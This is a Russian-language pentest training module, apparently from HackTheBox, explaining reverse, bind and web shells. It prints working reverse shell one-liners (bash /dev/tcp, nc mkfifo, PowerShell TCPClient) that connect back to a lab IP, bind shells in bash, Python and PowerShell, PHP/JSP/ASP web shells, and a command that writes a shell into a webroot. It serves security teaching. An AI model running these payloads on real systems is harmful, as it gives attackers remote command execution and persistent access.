# Types of Shells

Как только мы скомпрометируем систему и воспользуемся уязвимостью для удаленного выполнения команд на скомпрометированных хостах, нам обычно нужен метод связи с системой, чтобы не приходилось продолжать использовать одну и ту же уязвимость для выполнения каждой команды. Чтобы пронумеровать систему или получить дальнейший контроль над ней или внутри ее сети, нам необходимо надежное соединение, которое дает нам прямой доступ к оболочке системы, т.е. `Bash` или `PowerShell`, чтобы мы могли тщательно исследовать удаленную систему для следующего шага.

Один из способов подключения к скомпрометированной системе — через сетевые протоколы, такие как `SSH` для Linux или `WinRM`для Windows, что позволит нам удаленно войти в скомпрометированную систему. Однако, если мы не получим рабочий набор учетных данных для входа, мы не сможем использовать эти методы без предварительного выполнения команд в удаленной системе, чтобы в первую очередь получить доступ к этим службам.

Другой метод доступа к скомпрометированному хосту для управления и удаленного выполнения кода — через оболочки.  
Как обсуждалось ранее, существует три основных типа оболочек: Reverse Shell, Bind Shell и Web Shell. Каждая из этих оболочек имеет свой метод связи с нами для принятия и выполнения наших команд.

|Тип оболочки|Метод связи|
|---|---|
|`Reverse Shell`|Подключается обратно к нашей системе и дает нам контроль через обратное соединение.|
|`Bind Shell`|Ждет, пока мы к нему подключимся, и, как только мы это сделаем, даст нам контроль.|
|`Web Shell`|Общается через веб-сервер, принимает наши команды через параметры HTTP, выполняет их и выводит выходные данные.|

Давайте углубимся в каждую из вышеперечисленных оболочек и рассмотрим примеры каждой из них.

---
## Reverse Shell

А `Reverse Shell`— наиболее распространенный тип оболочки, поскольку это самый быстрый и простой способ получить контроль над скомпрометированным хостом. Как только мы обнаружим уязвимость на удаленном хосте, позволяющую удаленное выполнение кода, мы сможем запустить `netcat` прослушиватель на нашей машине, который прослушивает определенный порт, скажем, порт `1234`. Имея этот прослушиватель, мы можем выполнить `reverse shell command` который соединяет оболочку удаленной системы, т.е. `Bash` или `PowerShell` нашим `netcat` прослушиватель, который дает нам обратное соединение с удаленной системой.

---
#### Netcat Listener

Первый шаг – начать `netcat` прослушиватель на выбранном нами порту:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Мы используем следующие флаги:

|Флаг|Описание|
|---|---|
|`-l`|Режим прослушивания, чтобы дождаться соединения с нами.|
|`-v`|Подробный режим, чтобы мы знали, когда получим соединение.|
|`-n`|Отключите разрешение DNS и подключайтесь только с/к IP-адресам, чтобы ускорить соединение.|
|`-p 1234`|Номер порта `netcat` прослушивается, и должно быть отправлено обратное соединение.|

Теперь, когда у нас есть `netcat` прослушиватель, ожидающий соединения, мы можем выполнить команду обратной оболочки, которая подключается к нам.

---
#### Connect Back IP

Однако сначала нам нужно найти IP-адрес нашей системы, чтобы отправить нам обратное соединение. Мы можем узнать наш IP с помощью следующей команды:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

В нашем примере интересующий нас IP находится под `tun0`, это та же самая сеть HTB, к которой мы подключились через VPN.

Примечание. Мы подключаемся к IP-адресу в «tun0», потому что мы можем подключаться к устройствам HackTheBox только через VPN-соединение, поскольку они не имеют подключения к Интернету и, следовательно, не могут подключиться к нам через Интернет, используя «eth0». В реальном пентесте вы можете быть напрямую подключены к той же сети или выполнять внешний тест на проникновение, поэтому вы можете подключиться через адаптер eth0 или аналогичный.

---
#### Reverse Shell Command

Выполняемая нами команда зависит от того, в какой операционной системе работает скомпрометированный хост (например, Linux или Windows), а также от того, к каким приложениям и командам мы можем получить доступ. Страница Payload [All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) содержит полный список команд обратной оболочки, которые мы можем использовать и которые охватывают широкий спектр опций в зависимости от нашего скомпрометированного хоста.

Некоторые команды обратной оболочки более надежны, чем другие, и обычно их можно попытаться установить обратное соединение. Приведенные ниже команды являются надежными командами, которые мы можем использовать для получения обратного соединения, например: `bash` на скомпрометированных хостах Linux и `Powershell` на скомпрометированных хостах Windows:

Код: Баш

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Код: Баш

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Код: powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Мы можем использовать эксплойт, который у нас есть на удаленном хосте, для выполнения одной из вышеперечисленных команд, то есть с помощью эксплойта Python или модуля Metasploit, чтобы получить обратное соединение. Как только мы это сделаем, мы должны получить соединение в нашем `netcat` слушатель:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, после того, как мы получили соединение на нашем `netcat` прослушиватель, мы смогли ввести нашу команду и получить ее результат напрямую, прямо на нашей машине.

А `Reverse Shell`удобен, когда мы хотим получить быстрое и надежное соединение с нашим скомпрометированным хостом. Тем не менее, `Reverse Shell`может быть очень хрупким. Как только команда обратной оболочки будет остановлена ​​или если мы потеряем соединение по какой-либо причине, нам придется использовать первоначальный эксплойт, чтобы снова выполнить команду обратной оболочки, чтобы восстановить доступ.

---
## Bind Shell

Другой тип оболочки — `Bind Shell`. В отличие от `Reverse Shell` который подключается к нам, нам придется подключиться к нему по `targets'` прослушивающий порт.

Как только мы выполним `Bind Shell Command`, он начнет прослушивать порт на удаленном хосте и свяжет оболочку этого хоста, т. е. `Bash` или `PowerShell`, в этот порт. Нам нужно подключиться к этому порту с помощью `netcat`, и мы получим управление через оболочку этой системы.

---
#### Bind Shell Command

Опять же, мы можем использовать [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) , чтобы найти подходящую команду для запуска нашей оболочки привязки.

Примечание. Мы запустим прослушивающее соединение через порт «1234» на удаленном хосте с IP-адресом «0.0.0.0», чтобы мы могли подключиться к нему из любого места.

Ниже приведены надежные команды, которые мы можем использовать для запуска оболочки связывания:

Код: Баш

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Код: питон

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Код: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

---

#### Netcat Connection

Как только мы выполним команду оболочки привязки, оболочка должна ожидать нас на указанном порту. Теперь мы можем подключиться к нему.

Мы можем использовать `netcat` чтобы подключиться к этому порту и получить соединение с оболочкой:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, мы напрямую попадаем в сеанс bash и можем напрямую взаимодействовать с целевой системой. В отличие от `Reverse Shell`, если мы по какой-либо причине разорвем соединение с оболочкой привязки, мы сможем подключиться к нему обратно и немедленно получить другое соединение. Однако, если команда оболочки привязки будет остановлена ​​по какой-либо причине или если удаленный хост будет перезагружен, мы все равно потеряем доступ к удаленному хосту и нам придется использовать его снова, чтобы получить доступ.

---

#### Upgrading TTY

Подключившись к оболочке через Netcat, мы заметим, что можем только вводить команды или использовать клавишу Backspace, но мы не можем перемещать текстовый курсор влево или вправо для редактирования наших команд, а также не можем перемещаться вверх и вниз для доступа к истории команд. Чтобы это сделать, нам необходимо обновить наш TTY. Этого можно достичь путем сопоставления нашего терминала TTY с удаленным TTY.

Есть несколько способов сделать это. Для наших целей мы будем использовать `python/stty`метод. В нашем `netcat` оболочки, мы будем использовать следующую команду, чтобы использовать Python для обновления типа нашей оболочки до полного TTY:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

После запуска этой команды мы нажмем `ctrl+z` чтобы включить нашу оболочку в фоновый режим, вернуться на наш локальный терминал и ввести следующее `stty` команда:

Типы снарядов

```shell-session
www-data@remotehost$ ^Z

Uliam@htb[/htb]$ stty raw -echo
Uliam@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Как только мы ударим `fg`, это вернет нам `netcat`оболочка на передний план. На этом этапе терминал отобразит пустую строку. Мы можем ударить `enter` еще раз, чтобы вернуться к нашей оболочке или вводу `reset`и нажмите Enter, чтобы вернуть его. На этом этапе у нас будет полностью работающая оболочка TTY с историей команд и всем остальным.

Мы можем заметить, что наша оболочка не покрывает весь терминал. Чтобы это исправить, нам нужно выяснить несколько переменных. Мы можем открыть другое окно терминала в нашей системе, развернуть окна или использовать любой размер, который мы хотим, а затем ввести следующие команды, чтобы получить наши переменные:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ echo $TERM

xterm-256color
```

Типы снарядов

```shell-session
Uliam@htb[/htb]$ stty size

67 318
```

Первая команда показала нам `TERM` переменная, а вторая показывает нам значения для `rows` и `columns`, соответственно. Теперь, когда у нас есть переменные, мы можем вернуться к нашему `netcat` оболочки и используйте следующую команду, чтобы исправить их:

Типы снарядов

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Как только мы это сделаем, у нас должен быть `netcat` оболочка, которая использует все функции терминала, как и SSH-соединение.

---

## Web Shell

Последний тип оболочки, которую мы имеем, — это `Web Shell`. А `Web Shell` обычно это веб-скрипт, т.е. `PHP` или `ASPX`, который принимает нашу команду через параметры HTTP-запроса, такие как `GET` или `POST` параметры запроса, выполняет нашу команду и печатает ее вывод обратно на веб-страницу.

---
#### Writing a Web Shell

Прежде всего, нам нужно написать нашу веб-оболочку, которая бы пропускала нашу команду через `GET`запросите, выполните его и распечатайте выходные данные обратно. Сценарий веб-оболочки обычно представляет собой однострочный файл, который очень короткий и легко запоминается. Ниже приведены некоторые распространенные короткие сценарии веб-оболочки для распространенных веб-языков:

Код: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Код: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Код: асп

```asp
<% eval request("cmd") %>
```

---

#### Uploading a Web Shell

Когда у нас есть веб-оболочка, нам нужно поместить сценарий веб-оболочки в веб-каталог удаленного хоста (webroot), чтобы выполнить сценарий через веб-браузер. Это может произойти из-за уязвимости в функции загрузки, которая позволяет нам записать одну из наших оболочек в файл, т.е. `shell.php` и загрузите его, а затем получите доступ к нашему загруженному файлу для выполнения команд.

Однако, если у нас есть только удаленное выполнение команд с помощью эксплойта, мы можем записать нашу оболочку непосредственно в корневой каталог веб-сайта, чтобы получить к нему доступ через Интернет. Итак, первый шаг — определить, где находится корневой каталог. Ниже приведены веб-корни по умолчанию для обычных веб-серверов:

| Веб сервер | Веб-рут по умолчанию   |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\|   |
| `XAMPP`    | C:\xampp\htdocs\|      |

Мы можем проверить эти каталоги, чтобы увидеть, какой веб-корень используется, а затем использовать `echo`чтобы написать нашу веб-оболочку. Например, если мы атакуем хост Linux, на котором работает Apache, мы можем написать `PHP` оболочку с помощью следующей команды:

Код: Баш

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### Accessing Web Shell

После того, как мы напишем нашу веб-оболочку, мы сможем получить к ней доступ либо через браузер, либо с помощью `cURL`. Мы можем посетить `shell.php` страницу на взломанном веб-сайте и используйте `?cmd=id` выполнить `id` команда:

![[Pasted image 20240804223821.png]]

Другой вариант — использовать `cURL`:

Типы снарядов

```shell-session
Uliam@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, мы можем продолжать изменять команду, чтобы получить ее результат. Большим преимуществом веб-оболочки является то, что она обходит любые существующие ограничения брандмауэра, поскольку она не открывает новое соединение на порту, а запускается на веб-порте `80` или `443`или любой другой порт, который использует веб-приложение. Еще одним большим преимуществом является то, что если скомпрометированный хост будет перезагружен, веб-оболочка все равно останется на месте, и мы сможем получить к ней доступ и выполнить команду без повторного использования удаленного хоста.

С другой стороны, веб-оболочка не так интерактивна, как обратная оболочка и оболочка привязки, поскольку нам приходится постоянно запрашивать другой URL-адрес для выполнения наших команд. Тем не менее, в крайних случаях, можно закодировать `Python` скрипт, который автоматизирует этот процесс и предоставит нам полуинтерактивную веб-оболочку прямо в нашем терминале.